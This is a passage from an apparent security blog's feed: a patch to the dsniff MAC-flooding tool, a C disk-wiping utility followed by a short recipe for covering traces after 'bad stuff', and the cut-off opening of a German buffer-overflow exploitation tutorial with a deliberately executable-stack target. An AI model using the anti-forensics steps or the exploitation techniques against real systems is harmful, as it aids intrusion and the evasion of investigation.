<div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">--- dsniff-2.4_beta1-r6/macof.c	2015-01-20 08:50:53.980054279 +0100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+++ dsniff-2.4_beta1-r6_FIX/macof.c	2015-01-20 08:51:24.220054894 +0100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@@ -134,7 +134,7 @@ main(int argc, char *argv[])</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 		libnet_build_tcp(sport, dport, seq, 0, TH_SYN, 512,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 				 0, 0, LIBNET_TCP_H, NULL, 0, l, 0);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 		</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-		libnet_build_ipv4(LIBNET_TCP_H, 0,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+		libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, 0,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 				  libnet_get_prand(LIBNET_PRu16), 0, 64,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 				  IPPROTO_TCP, 0, src, dst, NULL, 0, l, 0);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Userspace tool for (anti-forensically safe) wiping unallocated disk space]]></title>
        <id>https://janstarke.github.io/blog/2014/02/20/userspace-tool-for-wiping-unallocated-disk-space</id>
        <link href="https://janstarke.github.io/blog/2014/02/20/userspace-tool-for-wiping-unallocated-disk-space"/>
        <updated>2014-02-20T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is just a simple idea and could as easily be rewritten in, e.g., Powershell, Perl, Python or whatever you want.]]></summary>
        <content type="html"><![CDATA[<p>This is just a simple idea and could as easily be rewritten in, e.g., Powershell, Perl, Python or whatever you want.</p>
<p>I had some problems with compressing the image of a virtual machine, which has been intensively used for a long period of time. I deleted all files inside the VM, but this does not really wipe the data, so that blocks of deleted files must be compressed as well. The simple fix of this is to overwrite unallocated blocks with all zeros.</p>
<p>Now, how to accomplish this? This is easy: We create a new file, and fill it with zeros. If we are finished (<code>fwrite()</code>failes), we are done and delete the file. That's it.</p>
<p>Here is the code. Feel free to reimplement it in the language of your choice:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdlib.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;string.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;signal.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token plain"> block_size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">512</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token plain"> block_count </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> filename </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"diskwipe.dat"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> block </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> FILE</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> fp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cleanup</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">block</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">block</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fp </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">fflush</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">fclose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		fp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">_unlink</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">perror</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Unable to delete diskwipe.dat: "</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">finish</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> res</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">cleanup</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">res</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">handle_sigint</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> sig</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">finish</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">do_wipe</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> count </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	fp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">fopen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"wbc"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fp </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">perror</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Unable to open diskwipe.dat: "</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">finish</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">block_count </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">fwrite</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">block</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> block_size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> block_count</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> fp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">fflush</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">fprintf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stderr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"\\r%lu"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">count</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">fclose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">signal</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">SIGINT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> handle_sigint</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	block </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">malloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">block_size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">block</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> block_size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">do_wipe</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">finish</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>By the way, this is a very simple way for doing anti forensics:</p>
<ol>
<li>do bad stuff</li>
<li>delete your files/traces</li>
<li>do a userspace wipe using a builtin scripting language, preferably using a one-liner</li>
</ol>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Solaris: Bufferoverflows in lx-Zones ausnutzen]]></title>
        <id>https://janstarke.github.io/blog/2014/01/27/solaris-bufferoverflows-in-lx-zones-ausnutzen</id>
        <link href="https://janstarke.github.io/blog/2014/01/27/solaris-bufferoverflows-in-lx-zones-ausnutzen"/>
        <updated>2014-01-27T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[In diesem Artikel wird gezeigt, dass es möglich ist, in einer Linux-Zone unter Solaris einen Shellcode auszuführen, wenn dieser einen bestimmten Aufbau hat.]]></summary>
        <content type="html"><![CDATA[<p>In diesem Artikel wird gezeigt, dass es möglich ist, in einer Linux-Zone unter Solaris einen Shellcode auszuführen, wenn dieser einen bestimmten Aufbau hat.</p>
<p>Zunächst wird beispielhaft ein Programm gezeigt, dass eine Bufferoverflow-Schwachstelle hat. Anschließend wird ein Shellcode entwickelt, der die Besonderheiten der User-Level-Calls in einer lx-Zone unter Solaris berücksichtigt. Das wird erreicht, indem der lx_brandz.so.1 ein virtueller Stack untergeschoben wird, damit der Shellcode während des Aufrufs von exec() nicht verändert wird. Abschließend werden ein Programm und ein Script entwickelt, die zusammen einen kompletten Injection-Vector erzeugen.</p>
<p>Um das Beispiel einfach zu halten, wird ein einfacher Stack-basierter Überlauf genutzt. Das angegriffene Programm wird nachfolgend gezeigt:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;sys/mman.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;errno.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">UNPROTECT_STACK</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">STACK_BEGIN</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">0x08046000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">STACK_SIZE</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">8192</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">STACK_PERMISSIONS</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression" style="color:#36acaa">PROT_READ </span><span class="token macro property expression operator" style="color:#393A34">|</span><span class="token macro property expression" style="color:#36acaa"> PROT_WRITE </span><span class="token macro property expression operator" style="color:#393A34">|</span><span class="token macro property expression" style="color:#36acaa"> PROT_EXEC</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Die Funktion <code>__get_esp()</code> wird über das Makro <code>TRACE_ESP</code> genutzt, um die Adresse des Stack auszugeben. Normalerweise steht in einem anzugreifenden Programm dieses Feature nicht zur Verfügung, daher kann es auch hier abgeschaltet werden. In einem solchen Fall kann der Wert des <code>%esp</code>-Registers einfach über die Nutzung eines Debuggers ermittelt werden.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__get_esp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">__asm__</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"movl %esp,%eax"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">ifdef</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression" style="color:#36acaa">PRINT_ESP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">TRACE_ESP</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">functionname</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">&nbsp;</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression function" style="color:#d73a49">printf</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property string" style="color:#e3116c">"%s at %%esp: 0x%08x\n"</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">functionname</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">__get_esp</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" 